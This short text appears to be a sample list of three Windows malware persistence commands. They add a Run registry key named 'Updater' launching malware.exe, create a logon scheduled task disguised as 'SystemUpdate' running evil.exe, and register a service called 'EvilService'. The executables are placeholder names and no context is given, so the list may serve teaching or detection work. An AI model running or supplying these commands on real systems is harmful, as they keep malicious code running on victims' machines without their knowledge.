reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d malware.exe
schtasks /create /tn "SystemUpdate" /tr "evil.exe" /sc onlogon
sc create EvilService binpath= "C:\evil.exe"
